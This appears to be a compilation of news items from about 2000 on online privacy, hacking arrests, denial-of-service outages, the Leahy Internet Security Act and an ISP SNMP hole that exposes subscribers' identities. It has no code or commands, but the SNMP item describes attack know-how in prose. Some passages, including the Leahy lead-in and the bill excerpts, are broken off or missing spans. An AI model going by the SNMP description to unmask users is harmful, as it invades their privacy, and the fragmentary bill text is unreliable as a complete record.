      The journey also would be full of rude surprises. As in Carroll's books, 
      she would eventually discover who she really was. But many others she had 
      never met would learn about her, too. Indeed, with every click of the 
      mouse, a bit more of her privacy would vanish down the rabbit hole.

      These days, a lot of people are stumbling on similar unpleasant surprises. 
      Thanks to a string of privacy gaffes involving DoubleClick (DCLK), 
      RealNetworks (RNWK), Amazon.com (AMZN), and other major Web sites, 
      consumers are learning that e-commerce companies have an intense interest 
      in their private information. For about 9 cents, some medical data sites 
      will sell you your neighbor's history of urinary tract infections. Your 
      speeding tickets, bounced checks, and delayed child-support payments are 
      an open book. In the background, advertising services are building 
      profiles of where people browse, what they buy, how they think, and who 
      they are. Hundreds of sites already are stockpiling this type of 
      information--some to use in targeted advertising, others to sell or trade 
      with other sites.

      GOLD RUSH. It will get worse. The tricks being played today are child's 
      play compared with what's coming. Web sites that want to know you better 
      will soon be able to track your movements on Web phones, palm devices, and 
      video games, and parse the data with more subtle software. Online services 
      can be layered with mounds of data about each person. Interactive TVs, for 
      instance, have the potential to correlate the Web sites you visit at work 
      with the ads you see at home in the evening.

      Web surfers don't need extra proof that this gold rush for personal data 
      is alarming. In a new Business Week/Harris Poll (page 96), 92% of Net 
      users expressed discomfort about Web sites sharing personal information 
      with other sites. The public outcry has grown so loud that in February, 
      search engine AltaVista Co. promised to ask explicit permission before 
      sharing visitors' personal information with other companies. On Mar. 2, 
      DoubleClick bowed to public pressure on a similar point: The company, 
      which serves up ads on many Web sites, has created anonymous digital 
      snapshots, or ''profiles,'' of millions of cybersurfers, based on where 
      they browse and what they do online. DoubleClick had planned to link 
      profiles with much more specific information, including names and 
      addresses culled from real-world databases that cover 90% of American 
      households. The company dropped that controversial plan, and within days, 
      smaller rival 24/7 Media Inc. abandoned a similar strategy.

      Anonymous tracking and profiling by DoubleClick and 24/7 can be very 
      subtle. But sometimes privacy violations hit you in the face. We have all 
      heard the examples of sociopaths who stalk their victims online. We have 
      seen the statistics on ''identity theft,'' in which criminals suck enough 
      personal data off the Net to impersonate other people. Perhaps these are 
      extreme examples. Even without them, many cybersurfers are starting to 
      feel that they have spent quite enough time at this particular Mad Tea 
      Party. They are ready for privacy rules that set some plain and simple 
      boundaries. In the March Business Week/Harris Poll, 57% of respondents 
      said government should pass laws on how personal information is collected. 
      ''What's going on today is exponentially more threatening to those who 
      want to protect privacy,'' says Eliot Spitzer, New York's state attorney 
      general who has proposed privacy legislation. People can't make informed 
      decisions on the Net because they lack the necessary information. ''What 
      we're confronting is a market failure,'' says Spitzer.

      Responding to a growing chorus of privacy-related complaints, some states 
      have drafted legislation ranging from curtailing the sale of personal 
      information to the creation of a privacy ombudsman. But this piecemeal, 
      state-by-state approach is a muddle. Scattershot laws will only create 
      more confusion. Over time, they will choke budding e-business in complex 
      litigation and red tape.

      Business Week believes there is a better way. Instead of a conflicting 
      patchwork of state rules, the federal government should adopt clear 
      privacy standards in the spirit of the Fair Information Practices--a 
      philosophical framework for privacy protection that has been adopted 
      worldwide over the past 25 years. The broad principles are essential:

      -- Companies conducting business online should be required by law to 
      disclose clearly how they collect and use information.

      -- Consumers must be given control of how their data are used.       -- 
      Web surfers should also have the ability to inspect that data and to 
      correct any errors they discover.

      -- And when companies break the rules, the government must have the power 
      to impose penalties. ''All of these bits you are sending out are your 
      digital DNA,'' says Tara Lemmey, president of the Electronic Frontier 
      Foundation. ''You should have control of that.''

      Regulation flies in the face of the approach industry has been 
      championing. For the past four years, Net companies have insisted that 
      they can police themselves on privacy. ''Industry initiatives and market 
      forces are already doing a good job,'' says Daniel J. Jaye, co-founder of 
      Engage Technologies Inc., which dishes up ads on the Web.

      In other words, the market will punish companies that fall afoul of 
      consumers. Bringing in the government, execs say, will pile bureaucratic 
      layers on top of the Net. This could undercut the very promise of 
      efficiency that many online businesses are counting on. The Internet, they 
      say, is supposed to draw companies closer to their customers, allowing 
      them to anticipate their desires. With profile data, they can target their 
      ads, slash wasteful and random marketing costs, design products faster, 
      and build higher profit margins. Profiling provides the underpinnings of a 
      new way of doing business upon which the Net Economy is built.

      Laws that require businesses to seek users' permission before they collect 
      or use data about Web-surfing habits could kill this goose, they say. And 
      why do that, industry execs ask, when they are making such fine strides in 
      protecting consumer privacy? As a positive sign, Net businesses trumpet a 
      May, 1999, Federal Trade Commission survey in which 66% of companies 
      queried had privacy policies.

      SELF-REGULATORY SHAM. We are not persuaded by these arguments. Few Web 
      sites give consumers real choices over the data that get collected online. 
      There is no proof that if given a choice--especially bolstered with 
      financial incentives proffered by Web merchants--consumers won't willingly 
      hand over some personal data. As for privacy policies, the same FTC survey 
      showed that while more than 90% of companies polled collected personal 
      information, fewer than 10% actually followed all of the established Fair 
      Information Practices.

      In short, self-regulation is a sham. The policies that companies have 
      posted under pressure from the government are as vague and confusing as 
      anything Lewis Carroll could have dreamed up. One simple example: When 
      people register at Yahoo! Inc. (YHOO) for one of its services, such as My 
      Yahoo, they are asked to provide their birth date and e-mail 
      address--ostensibly as a safeguard if they forget their user name and need 
      prompting. But Yahoo also uses that information for a service called the 
      Birthday Club, sending product offers from three to five merchants to 
      users via e-mail on their birthday.

      Don't look for transparency here. Most sites don't limit how they or their 
      partners use consumer information. And Web sites can transfer information 
      to partners without telling their own customers. Many sites also change 
      their practices at will and without warning.

      Because privacy breaches are so corrosive to consumer trust, some Web 
      execs actually welcome broad national standards. IBM (IBM) and Walt Disney 
      Co. (DIS) have decided not to advertise on Web sites that don't have 
      privacy policies. Privacy codes must be clearer, says Chris Larsen, CEO 
      and founder of E-Loan Inc. (EELN), an online loan service that has its 
      privacy policies audited. ''I think the industry has squandered the 
      opportunity to take care of this on its own.'' IBM Chairman Louis Gerstner 
      doesn't go that far. But he has warned Net executives that they must get 
      serious. ''I am troubled, very troubled, by leaders who have failed to 
      recognize our responsibility in the transformation of the new economy,'' 
      he says.

      We hope other Web execs are listening closely. The policies we propose are 
      in the best interests of Web businesses. If more consumers can be assured 
      that their personal information is safe, more of them will flock to the 
      Net--and click, not exit. There are other explicit benefits for the 
      industry. Privacy standards create a level playing field, so companies 
      don't fall into an arms war, each trying to collect the most data--at any 
      cost. ''Business will benefit from the right level of government 
      involvement,'' says Nick Grouf, founder of PeoplePC, which offers cheap 
      PCs and Net connections. ''Standards are good, but they need some teeth, 
      and this is where government becomes a good partner.''

      FEDERAL STANDARD. In the long term, the privacy protection that Business 
      Week espouses will make life simpler for businesses on the Net. More than 
      20 states already are moving to enact some kind of guarantees. A minimum 
      federal standard of online privacy would decrease the cost and complexity 
      for companies. It also would increase trust. If businesses really want to 
      be close to their customers, trust is paramount. This approach also will 
      shrink the gap that has arisen between the U.S. and Europe, where privacy 
      already is recognized as a right. The Europeans have stood firm, putting 
      American companies in the peculiar position of extending greater privacy 
      protection in Germany or France than at home.

      It's time to iron out the inconsistencies. Here are our prescriptions for 
      protecting personal privacy without jeopardizing the promise of 
      e-commerce...

     Federal judge bans convicted hacker from taking part in tech conference A 
     federal judge Monday banned convicted computer hacker Kevin Mitnick from 
     taking part in a technology conference in Salt Lake City Wednesday. 
     Mitnick, who gained notoriety for his hacking exploits and spent several 
     years in a federal prison in Lompac, Calif., won't be sitting on a computer 
     security panel discussion at the Utah Information Technologies Association 
     conference at the Salt Palace Convention Center. The judge kiboshed the 
     appearance because Mitnick's prison release agreement prohibits him from 
     "consulting or advising" on the topic of computer-related activity. Monday, 
     Mitnick did an extended interview promoting the panel discussion on KSL's 
     Doug Wright Show, where he answered callers' questions about computer 
     security and told the story of his hacking exploits. He hacked for fun, he 
     said, and never made any money from it. Richard Nelson, president of UITA, 
     said Mitnick's public relations representative had indicated that Mitnick 
     had permission to appear from the U.S. probation office in California. A 
     few days ago, the organization learned he might not be able to leave 
     California. Conference organizers are in the process of arranging a 
     replacement for Mitnick on the cyber-security panel. They are planning on 
     bringing in a senior staffer from a large company that deals with cyber 
     security. Nelson said he's sorry Mitnick can't participate. "He's eager to 
     talk and disappointed he can't come. If you listened (to him on the radio 
     show), he recognizes he made serious mistakes and he wanted to go forward. 
     "We're not trying to promote his career, but if he can help information 
     technology companies in Utah and decision makers dealing with security 
     issues determine what level of risk they want to take, that's good. There 
     will always be risk, but you can reduce it by taking security measures."

      The National Science Foundation is expected to release applications next 
      month for grants that would fund the Federal Cyber Services program 
      designed to train the next generation of digital defenders. 

      The NSF grants would be available to colleges and universities, which 
      would use the money to award scholarships to students to study information 
      assurance. These students would receive the scholarships in exchange for 
      full-time employment with a federal agency upon graduation. The students 
      would help protect the governments systems from cyberattack. 

      NSF hopes to announce by September or October which schools will receive 
      the grants and hopes to award the actual student scholarships by January 
      2001, said Shirley Malia, program manager for education and training with 
      the governments Critical Infrastructure Assurance Office, speaking at the 
      FOSE conference. 

      Malia said plans also are under way to establish a virtual nationwide 
      network of training centers that offer information assurance courses. The 
      courses would match a set of competencies for information assurance 
      professionals that the Office of Personnel Management is developing. The 
      hope is that agencies would use these centers to keep their cybersecurity 
      workers trained. "If we dont keep the skills of information assurance 
      [workers] up-to-date, we are extremely vulnerable," Malia said. 

      The Cyber Services and virtual training network projects are dependent on 
      fiscal 2001 funding to proceed, Malia said

     EMI Plays Along with Downloads 
     by Brad King 
     3:00 a.m. Apr. 19, 2000 PDT 
     Musicians who want to play along with Aerosmith, Lenny Kravitz, or The
     Counting Crows will soon have access to EMI Music Publishing's sheet 
     music library online. 

      The subsidiary of the EMI music label on Tuesday said it will give 
      digital rights management company Net4Music access to one million of
      the label's songs in exchange for a minority equity stake. 

      Net4Music will post 1,000 titles on its site by the end of April, and then 
      will add 10,000 songs each month until 100,000 songs are posted. 

      This is the first time a major label has taken steps to have its entire 
      catalog encoded and sold in digital format. 

      "This is a niche market for musicians and people who are looking for sheet 
      music to play," said Martin Bandier, CEO of EMI Publishing. "It's tough to 
      find a music store that sells sheet music. Now all you have to do is have 
      a computer terminal." 

      Net4Music will offer single songs for $3.95 per copy, but the downloads 
      will feature encryption that limits the number of printouts that can be 
      made. 

      Similar types of digital encryption that limit the reuse of content after 
      purchase, such as SDMI, InterTrust, and Sony's memory stick, have been 
      failures with consumers. Meanwhile, other attempts at securing content, 
      like Windows Media Audio, Liquid Audio, and e-books, have proven too easy 
      to circumvent. 

      Francois DuLiege, CEO of Net4Music, said his encryption system will not 
      discourage consumers. 

      "You will pay less for five copies of digital sheet music than you would 
      for one copy of sheet music if you went to a retail store," he said. "Most 
      songs in retail stores don't sell single sets of music, so you have to 
      purchase the whole package. This, I believe, is much easier for 
      consumers." 

      The major music labels have been slow to make recorded music and 
      compositions available in digital form, but rights management company 
      Sunhawk set a precedent by signing a deal in 1998 to digitize content from 
      Warner Music's music catalog.

      Sunhawk has been digitizing Warner's Christian music for two years, but 
      has only digitized about 10,000 songs thus far, having branched out to 
      encode and digitize other media beyond music. 

      EMI's Bandier believes the Net4Music deal will expand demand for EMI 
      content. 

      "The Christian music business is a small homespun business that is 
      dependent upon the congregation and others knowing all the lyrics to the 
      music, so getting that content out there as quickly as possible was 
      important," Bandier said. "But that only makes up about 5 percent of our 
      business." 

      Sunhawk CEO Marlin Eller said the deal will only help move the music 
      industry to embrace digital e-commerce. 

      "This validates exactly what we are trying to do digitally," Eller said. 
      "Industry executives should learn to get off their butts and license their 
      content. We haven't been seeing theft with this content so far. But (the 
      reluctant labels) are allowing piracy to take place by not putting up a 
      legitimate source of content"

91.0 [HNN] ISPs Still Vulnerable to SNMP Holes 
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     contributed by Javaman 
     Whiles holes in SNMP are nothing new it is surprising just how
     vulnerable some ISPs still are to the problem. Philtered.net says that
     now a malicious person could extract an ISP users login name and phone
     number directly from the terminal server thereby equating an IP
     address with a real person.

     ISPs Battle Privacy Loophole By Brian McWilliams

      Internet service providers Thursday are being warned to batten down their 
      network access servers against a familiar type of privacy attack that's 
      making a comeback. 

      According to a bug-tracking group, so-called greyhat hackers say they have 
      developed a Perl script that can quietly extract subscribers' phone 
      numbers and log-in names directly off an ISP's terminal servers using the 
      Simple Network Management Protocol (SNMP). 

      Philadelphia-based Philtered.Net is an online community that pursues their 
      own venue of security-related technical projects. One of the groups 
      hackers, who uses the handle "Lumpy," said an unauthorized person, armed 
      with the script and an Internet user's IP address, can easily query a 
      database on the ISPs access server. 

      According to Lumpy, it's easy to call the management information base of 
      an ISPs access server and use standard SNMP commands to transform an 
      anonymous IP address into the real-world coordinates of a live person. 

      "People usually think that their IP address is as far as a hacker could go 
      to find out who they are," Lumpy said. "But a hacker has the ability to 
      find out who they are through a server directory to discover a person's 
      home phone numbers and full address." 

      Lumpy also works as a security consultant and authored the script for 
      probing SNMP information. He recently posted the information and the 
      script on the Bugtraq mailing list. 

      Lumpy said three major ISPs were vulnerable to the attack, but after being 
      notified the firms took action and properly locked down their servers to 
      prevent SNMP access. Lumpy also claims that some ISPs have their servers 
      configured to allow write access permissions to their MIBs and that he's 
      been able to force dial-up users offline. 

      Jeff Case, president of SNMP.com, a Tennessee-based network 
      management-consulting firm, said the unsecured nature of older versions of 
      SNMP is common knowledge. 

      "The first version of SNMP is not secure and is subject to these sorts of 
      attacks," Case said. "We've know about that since 1988 and a new version 
      of SNMP was made available in 1998. It's been deployed to plug-up the 
      security holes." 

      But Lumpy of Philtered.net said that most ISPs could prevent unauthorized 
      access to their MIBs by properly configuring the hardware when technicians 
      initially set up a network. 

      "The reason these holes exists is because people have not bothered to read 
      the manual where it says in big letters 'change your community names and 
      block off access to SNMP,' but some ISPs aren't wasting time reading 
      manuals so this is what happens." 

      ISPs that want to determine if a SNMP privacy hole exists on their 
      networks can check out the BugTraq advisory at SecurityFocus.com in order 
      to tighten-up access to their networks.

     Senator Patrick Leahy has introduced into the Senate the Internet

     the 'loophole' that prevents officers from from monitoring an

      [Excerpt]
      
            By Mr. LEAHY:
        S. 2430. A bill to combat computer hacking through enhanced law
      enforcement and to protect the privacy and constitutional rights of
      Americans, and for other purposes; to the Committee on the Judiciary.
      
                           Internet Security Act of 2000
      
        Mr. LEAHY. Mr. President, as we head into the twenty-first century,
      computer-related crime is one of the greatest challenges facing law
      enforcement. Many of our critical infrastructures and our government
      depend upon the reliability and security of complex computer systems.
      We need to make sure that these essential systems are protected from
      all forms of attack. The legislation I am introducing today will help
      law enforcement investigate and prosecute those who jeopardize the
      integrity of our computer systems and the Internet.
        Whether we work in the private sector or in government, we negotiate
      daily through a variety of security checkpoints designed to protect
      ourselves from being victimized by crime or targeted by terrorists. For
      instance, congressional buildings like this one use cement pillars
      placed at entrances, photo identification cards, metal detectors, x-ray
      scanners, and security guards to protect the physical space. These
      security steps and others have become ubiquitous in the private sector
      as well.
        Yet all these physical barriers can be circumvented using the wires
      that run into every building to support the computers and computer
      networks that are the mainstay of how we communicate and do business.
      This plain fact was amply demonstrated by the recent hacker attacks on
      E-Trade, ZDNet, Datek, Yahoo, eBay, Amazon.com and other Internet
      sites. These attacks raise serious questions about Internet security--
      questions that we need to answer to ensure the long-term stability of
      electronic commerce. More importantly, a well-focused and more malign
      cyber-attack on computer networks that support telecommunications,
      transportation, water supply, banking, electrical power and other
      critical infrastructure systems could wreak havoc on our national
      economy or even jeopardize our national defense. We have learned that
      even law enforcement is not immune. Just recently we learned of a
      denial of service attack successfully perpetrated against a FBI web
      site, shutting down that site for several hours.
        The cybercrime problem is growing. The reports of the CERT
      Coordination Center (formerly called the ``Computer Emergency Response
      Team''), which was established in 1988 to help the Internet community
      detect and resolve computer security incidents, provide chilling
      statistics on the vulnerabilities of the Internet and the scope of the
      problem. Over the last decade, the number of reported computer security
      incidents grew from 6 in 1988 to more than 8,000 in 1999. But that
      alone does not reveal the scope of the problem. According to CERT's
      most recent annual report, more than four million computer hosts were
      affected by the computer security incidents in 1999 alone by damaging
      computer viruses, with names like ``Melissa,'' ``Chernobyl,''
      ``ExploreZip,'' and by the other ways that remote intruders have found
      to exploit system vulnerabilities. Even before the recent headline-
      grabbing ``denial-of-service'' attacks, CERT documented that such
      incidents ``grew at rate around 50% per year'' which was ``greater than
      the  rate of growth of Internet hosts.''
      
        CERT has tracked recent trends in severe hacking incidents on the
      Internet and made the following observations, First, hacking techniques
      are getting more sophisticated. That means law enforcement is going to
      have to get smarter too, and we need to give them the resources to do
      this. Second, hackers have ``become increasingly difficult to locate
      and identify.'' These criminals are operating in many different
      locations and are using techniques that allow them to operate in
      ``nearly total obscurity.''
        We have been aware of the vulnerabilities to terrorist attacks of our
      computer networks for more than a decade. It became clear to me, when I
      chaired a series of hearings in 1988 and 1989 by the Subcommittee on
      Technology and the Law in the Senate Judiciary Committee on the subject
      of high-tech terrorism and the threat of computer viruses, that merely
      ``hardening'' our physical space from potential attack would only
      prompt committed criminals and terrorists to switch tactics and use new
      technologies to reach vulnerable softer targets, such as our computer
      systems and other critical infrastructures. The government has a
      responsibility to work with those in the private sector to assess those
      vulnerabilities and defend them. That means making sure our law
      enforcement agencies have the tools they need, but also that the
      government does not stand in the way of smart technical solutions to
      defend our computer systems.
        Targeting cybercrime with up-to-date criminal laws and tougher law
      enforcement is only part of the solution. While criminal penalties may
      deter some computer criminals, these laws usually come into play too
      late, after the crime has been committed and the injury inflicted. We
      should keep in mind the adage that the best defense is a good offense.
      Americans and American firms must be encouraged to take preventive
      measures to protect their computer information and systems. Just
      recently, internet providers and companies such as Yahoo! and
      Amazon.com Inc., and computer hardware companies such a Cisco Systems
      Inc., proved successful at stemming attacks within hours thereby
      limiting losses.
        That is why, for years, I have advocated and sponsored legislation to
      encourage the widespread use of strong encryption. Encryption is an
      important tool in our arsenal to protect the security of our computer
      information and networks. The Administration made enormous progress
      earlier this year when it issued new regulations relaxing export
      controls on strong encryption. Of course, encryption technology cannot
      be the sole source of protection for our critical computer networks and
      computer-based infrastructure, but we need to make sure the government
      is encouraging--and not restraining--the use of strong encryption and
      other technical solutions to protecting our computer systems.
        Congress has responded again and again to help our law enforcement
      agencies keep up with the challenges of new crimes being executed over
      computer networks. In 1984, we passed the Computer Fraud and Abuse Act,
      and  its amendments, to criminalize conduct when carried out by means
      of unauthorized access to a computer. In 1986, we passed the Electronic
      Communications Privacy Act (ECPA), which I was proud to sponsor, to
      criminalize tampering with electronic mail systems and remote data
      processing systems and to protect the privacy of computer users. In the
      104th Congress, Senators Kyl, Grassley, and I worked together to enact
      the National Information Infrastructure Protection Act to increase
      protection under federal criminal law for both government and private
      computers, and to address an emerging problem of computer-age blackmail
      in which a criminal threatens to harm or shut down a computer system
      unless their extortion demands are met.
      
      [[Page S2739]]
      
        In this Congress, I have introduced a bill with Senator DeWine, the
      Computer Crime Enforcement Act, S. 1314, to set up a $25 million grant
      program within the U.S. Department of Justice for states to tap for
      improved education, training, enforcement and prosecution of computer
      crimes. All 50 states have now enacted tough computer crime control
      laws. These state laws establish a firm groundwork for electronic
      commerce and Internet security. Unfortunately, too many state and local
      law enforcement agencies are struggling to afford the high cost of
      training and equipment necessary for effective enforcement of their
      state computer crime statutes. Our legislation, the Computer Crime
      Enforcement Act, would help state and local law enforcement join the
      fight to combat the worsening threats we face from computer crime.
        Computer crime is a problem nationwide and in Vermont. I recently
      released a survey on computer crime in Vermont. My office surveyed 54
      law enforcement agencies in Vermont--43 police departments and 11
      State's attorney offices--on their experience investigating and
      prosecuting computer crimes. The survey found that more than half of
      these Vermont law enforcement agencies encounter computer crime, with
      many police departments and state's attorney offices handling 2 to 5
      computer crimes per month.
        Despite this documented need, far too many law enforcement agencies
      in Vermont cannot afford the cost of policing against computer crimes.
      Indeed, my survey found that 98% of the responding Vermont law
      enforcement agencies do not have funds dedicated for use in computer
      crime enforcement.
        My survey also found that few law enforcement officers in Vermont are
      properly trained in investigating computer crimes and analyzing cyber-
      evidence. According to my survey, 83% of responding law enforcement
      agencies in Vermont do not employ officers properly trained in computer
      crime investigative techniques. Moreover, my survey found that 52% of
      the law enforcement agencies that handle one or more computer crimes
      per month cited their lack of training as a problem encountered during
      investigations. Proper training is critical to ensuring success in the
      fight against computer crime.
        This bill will help our computer crime laws up to date as an
      important backstop and deterrent. I believe that our current computer
      crime laws can be enhanced and that the time to act is now. We should
      pass legislation designed to improve our law enforcement efforts while
      at the same time protecting the privacy rights of American citizens.
        The bill I offer today will make it more efficient for law
      enforcement to use tools that are already available--such as pen
      registers and trap and trace devices--to track down computer criminals
      expeditiously. It will ensure that law enforcement can investigate and
      prosecute hacker attacks even when perpetrators use foreign-based
      computers to facilitate their crimes. It will implement criminal
      forfeiture provisions to ensure that cybercriminals are forced to
      relinquish the tools of their trade upon conviction. It will also close
      a current loophole in our wiretap laws that prevents a law enforcement
      officer from monitoring an innocent-host computer with the consent of
      the computer's owner and without a wiretap order to track down the
      source of denial-of-service attacks. Finally, this legislation will
      assist state and local police departments in their parallel efforts to
      combat cybercrime, in recognition of the fact that this fight is not
      just at the federal level.
        The key provisions of the bill are:
        Jurisdictional and Definitional Changes to the Computer Fraud and
      Abuse Act: The Computer Fraud and Abuse Act, 18 U.S.C. Sec. 1030, is
      the primary federal criminal statute prohibiting computer frauds and
      hacking. This bill would amend the statute to clarify the appropriate
      scope of federal jurisdiction. First, the bill adds a broad definition
      of ``loss'' to the definitional section. Calculation of loss is
      important both in determining whether the $5,000 jurisdictional hurdle
      in the statute is met, and, at sentencing, in calculating the
      appropriate guideline range and restitution amount.
        Second, the bill amends the definition of ``protected computer,'' to
      expressly include qualified computers even when they are physically
      located outside of the United States. This clarification will preserve
      the ability of the United States to assist in international hacking
      cases. A ``Sense of Congress'' provision specifies that federal
      jurisdiction is justified by the ``interconnected and interdependent
      nature of computers used in interstate or foreign commerce.''
        Finally, the bill expands the jurisdiction of the United States
      Secret Service to encompass investigations of all violations of 18
      U.S.C. Sec. 1030. Prior to the 1996 amendments to the Computer Fraud
      and Abuse Act, the Secret Service was authorized to investigate any and
      all violations of section 1030, pursuant to an agreement between the
      Secretary of Treasury and the Attorney General. The 1996 amendments,
      however, concentrated Secret Service jurisdiction on certain specified
      subsections of section 1030. The current amendment would return full
      jurisdiction to the Secret Service and would allow the Justice and
      Treasury Departments to decide on the appropriate work-sharing balance
      between the two.
        Elimination of Mandatory Minimum Sentence for Certain Violations of
      Computer Fraud and Abuse Act: Currently, a directive to the Sentencing
      Commission requires that all violations, including misdemeanor
      violations, of  certain provisions of the Computer Fraud and Abuse Act
      be punished with a term of imprisonment of at least six months. The
      bill would change this directive to the Sentencing Commission so that
      no such mandatory minimum would be required.
      
        Additional Criminal Forfeiture Provisions: The bill adds a criminal
      forfeiture provision to the Computer Fraud and Abuse Act, requiring
      forfeiture of physical property used in or to facilitate the offense as
      well as property derived from proceeds of the offense. It also
      supplements the current forfeiture provision in 18 U.S.C. 2318, which
      prohibits trafficking in, among other things, counterfeit computer
      program documentation and packaging, to require the forfeiture of
      replicators and other devices used in the production of such
      counterfeit items.
        Pen Registers and Trap and Trace Devices: The bill makes it easier
      for law enforcement to use these investigative techniques in the area
      of cybercrime, and institutes corresponding privacy protections. On the
      law enforcement side, the bill gives nationwide effect to pen register
      and trap and trace orders obtained by Government attorneys, thus
      obviating the need to obtain identical orders in multiple federal
      jurisdictions. It also clarifies that such devices can be used on all
      electronic communication lines, not just telephone lines. On the
      privacy side, the bill provides for greater judicial review of
      applications for pen registers and trap and trace devices and
      institutes a minimization requirement for the use of such devices. The
      bill also amends the reporting requirements for applications for such
      devices by specifying the information to be reported.
        Denial of Service Investigations: Currently, a person whose computer
      is accessed by a hacker as a means for the hacker to reach a third
      computer cannot simply consent to law enforcement monitoring of his
      computer. Instead, because this person is not technically a party to
      the communication, law enforcement needs wiretap authorization under
      Title III to conduct such monitoring. The bill will close this loophole
      by explicitly permitting such monitoring without a wiretap if prior
      consent is obtained from the person whose computer is being hacked
      through and used to send ``harmful interference to a lawfully operating
      computer system.''
        Encryption Reporting: The bill directs the Attorney General to report
      the number of wiretap orders in which encryption was encountered and
      whether such encryption precluded law enforcement from obtaining the
      plaintext of intercepted communications.
        State and Local Computer Crime Enforcement: The bill directs the
      Office of Federal Programs to make grants to assist State and local law
      enforcement in the investigation and prosecution of computer crime.
        Legislation must be balanced to protect our privacy and other
      constitutional rights. I am a strong proponent
      
      [[Page S2740]]
      
      of the Internet and a defender of our constitutional rights to speak
      freely and to keep private our confidential affairs from either private
      sector snoops or unreasonable government searches. These principles can
      be respected at the same time we hold accountable those malicious
      mischief makers and digital graffiti sprayers, who use computers to
      damage or destroy the property of others. I have seen Congress react
      reflexively in the past to address concerns over anti-social behavior
      on the Internet with legislative proposals that would do more harm than
      good. A good example of this is the Communications Decency Act, which
      the Supreme Court declared unconstitutional. We must make sure that our
      legislative efforts are precisely targeted on stopping destructive acts
      and that we avoid scattershot proposals that would threaten, rather
      than foster, electronic commerce and sacrifice, rather than promote,
      our constitutional rights.
        Technology has ushered in a new age filled with unlimited potential
      for commerce and communications. But the Internet age has also ushered
      in new challenges for federal, state and local law enforcement
      officials. Congress and the Administration need to work together to
      meet these new challenges while preserving the benefits of our new era.
      The legislation I offer today is a step in that direction.
        Mr. President, I ask unanimous consent that the text of the bill be
      printed in the Record.
        There being no objection, the bill was ordered to be printed in the
      Record, as follows:

                                S. 2430

     SEC. 3. SENSE OF CONGRESS.

       It is the sense of Congress that--
       (1) acts that damage or attempt to damage computers used in
     the delivery of critical infrastructure services such as
     telecommunications, energy, transportation, banking and
     financial services, and emergency and government services
     pose a serious threat to public health and safety and cause
     or have the potential to cause losses to victims that include
     costs of responding to offenses, conducting damage
     assessments, and restoring systems and data to their
     condition prior to the offense, as well as lost revenue and
     costs incurred as a result of interruptions of service; and
       (2) the Federal Government should have jurisdiction to
     investigate acts affecting protected computers, as defined in
     section 1030(e)(2)(B) of title 18, United States Code, as
     amended by this Act, even if the effects of such acts occur
     wholly outside the United States, as in such instances a
     sufficient Federal nexus is conferred through the
     interconnected and interdependent nature of computers used in
     interstate or foreign commerce or communication.

     SEC. 4. MODIFICATION OF SENTENCING COMMISSION DIRECTIVE.

       Pursuant to its authority under section 994(p) of title 28,

     shall amend the Federal sentencing guidelines to ensure that
     any individual convicted of a violation of paragraph (4) or

     wire or electronic communication service in the United States
     whose assistance is necessary to effectuate the order.
       ``(2) Requests from state investigative or law enforcement

     device within the jurisdiction of the court, if the court
     finds, based on the certification by the State law
     enforcement or investigative officer, that the information
     likely to be obtained by such installation and use is
     relevant to an ongoing criminal investigation.''; and

      PSINet hit by denial-of-service attack NEIL ART 

      
      --------------------------------------------------------------------------
      ------ Updated at 8.55pm: A denial-of-service attack on PSINet Hong Kong 
      on Wednesday disabled the Internet service provider's Web-hosting servers 
      for most of the day, leaving many of its dotcom customers without e-mail 
      and Web sites. However, more than a day after the attack took place, the 
      ISP was still unable to determine whether it was the result of an outside 
      hacker or an internal blunder. 

      William Kwan, president PSINet Hong Kong, said "unusual amounts of traffic 
      were generated by a desktop computer through the network", which might 
      have been caused by a programmer checking data traffic. 

      A denial-of-service attack is one in which a large volume, or packets, of 
      information are continually sent to a network server, disrupting network 
      connectivity because the server is unable to answer the demand. 

      "We don't know what caused the large volume of traffic," Mr Kwan said, 
      adding that the company had not contacted the police. 

      The attack started around 1.45pm on Wednesday, PSINet said, adding that 
      its leased-line network was partially restored in two hours and fully 
      restored by 7pm. 

      However, PSINet's dial-up network was still experiencing problems as late 
      as midnight, according to some of its customers. 

      Clients said their e-mail services and Web sites were down for most of the 
      day. 

      Dennis Skouse, managing director Spin Design and Advertising, said he came 
      to work around 9.30am to find his e-mail box missing. His computer gave 
      him a message that it could not locate the server. 

      He said his company "absolutely relied" on e-mail to "send PDF [portable 
      document format] files all over the place for [client] approval". 

      Mr Skouse said that throughout the day he was sporadically able to access 
      and check his e-mail. He said it was bad timing because many people were 
      leaving Hong Kong for the Easter holiday and wanted to finalise designs 
      with his firm before doing so. 

      David Croasdale, business director Newell Public Relations, said the 
      company was off-line from mid-morning for most of the day. 

      "We rely a lot on e-mail to keep in touch with clients," he said. "Our 
      clients rely on Newell to get their messages out." 

      Newell founder Stuart Newell said: "The whole office felt completely out 
      of touch. Potentially, it could have a serious effect on business in Hong 
      Kong." 

      Advedi, a Web and e-mail services company, was also adversely affected, as 
      were many of its clients, said Patrick Ceulemans, co-founder and director 
      of Advedi. 

      "Basically, we are out of business as well as our clients," he said, 
      adding, however, that his company was able to re-establish service with 
      another ISP. 

      "It was down for at least two hours that I know of," said Mr Ceulemans. 
      "It is unfortunate, but this is life." 

      He said he had e-mailed PSINet, but it had not responded. 

      "There should be some system in place to notify clients, so that they in 
      turn may take appropriate action," said Mr Ceulemans. 

      PSINet declined to comment on the disruption to its services when 
      contacted on Wednesday night, but issued a brief statement on Thursday. 

      It said the disruption of service was due to PSINet's sharing of an 
      internal PC network with that of the customer network. 

      "Remedial actions have been taken immediately by relocating and 
      reconfiguring our internal network. We will do our utmost to minimise 
      similar problems from occurring in the future."

     While the saga of Elian Gonzalez played out in the popular media over
     the weekend the tech reporters were busy trying to find a new angle on
     the MafiaBoy arrest last week. MafiaBoy has been charged in Canada
     with initiating a denial of service attack against CNN.
     
     MafiaBoy's lawyer has said that they expect a long, complex and
     technical trial. (Hopefully this means that he will not be pleading
     out.)
     Washington Post
     
     Canadian police said on Saturday they had charged MafiaBoy's father of
     conspiring with another man to commit assault. Evidence for the
     charges was gathered by using the wiretaps originally placed to gather
     evidence on the boy.
     Reuters - via Go2net
     
     The Free MafiaBoy web site has supposedly been threatened with a
     lawsuit by the lawyers for relatives of Michael Lyle. Michael Lyle
     claims to have had IRC conversations with MafiaBoy prior to his
     arrest.

     HV2k aka High Voltage 2000 appears to have been raided in relation to
     several Canadian and US government defacements. SLiPY was raided in
     late January by DND, NIS and the RCMP. The next day eg0death (Bleeding
     Angel) was arrested by the US authorities in Texas. The current status
     of eg0death, who was also in Global Hell, and SliPY are unclear at
